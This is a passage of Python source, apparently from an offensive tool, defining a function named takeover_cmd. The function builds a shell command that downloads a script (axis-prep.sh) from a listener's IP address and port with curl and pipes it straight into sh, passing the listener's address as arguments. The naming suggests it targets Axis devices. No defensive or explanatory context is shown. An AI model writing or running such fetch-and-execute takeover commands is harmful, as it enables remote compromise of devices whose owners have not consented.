...
def takeover_cmd(listen_ip: str, listen_port: int, www: bool=False) -> str:
    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/axis/axis-prep.sh | sh -s -- {listen_ip} {listen_port} {1 if www else 0}"
